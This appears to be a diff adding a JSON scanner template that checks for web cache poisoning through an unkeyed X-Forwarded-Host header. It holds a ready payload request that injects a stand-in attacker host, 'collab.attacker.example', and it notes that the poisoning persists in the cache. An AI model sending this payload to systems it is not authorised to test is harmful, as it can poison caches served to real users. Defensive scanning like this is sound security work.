@@ -1,0 +1,40 @@
+{
+  "name": "web/Web cache poisoning unkeyed X-Forwarded-Host",
+  "description": "[high] Proves web cache poisoning via unkeyed X-Forwarded-Host: the attacker host surfaces in the payload response but not the baseline = attacker-controlled absolute URL into a cached page. Keywords: cache poisoning x-forwarded-host host header unkeyed webcache. ctrl: benign request adds no marker -> not falsified. NOTE: a poisoned cache keeps serving the marker to later trials (persistence); base_url = site root.",
+  "cwe": "CWE-444",
+  "requests": {
+    "baseline": {
+      "method": "GET",
+      "url": "{{base_url}}/"
+    },
+    "payload": {
+      "method": "GET",
+      "url": "{{base_url}}/",
+      "headers": {
+        "X-Forwarded-Host": "https://collab.attacker.example"
+      }
+    }
+  },
+  "conditions": [
+    {
+      "type": "body_regex",
+      "request": "payload",
+      "pattern": "https://collab\\.attacker\\.example",
+      "present": true
+    },
+    {
+      "type": "body_regex",
+      "request": "baseline",
+      "pattern": "https://collab\\.attacker\\.example",
+      "present": false
+    }
+  ],
+  "params": [
+    "base_url"
+  ],
+  "source": "imported",
+  "successes": 1,
+  "id": "cd74dd8a9a0b",
+  "created": "2026-11-05T18:01:37.085987+00:00",
+  "last_used": "2026-11-05T18:01:37.085987+00:00"
+}
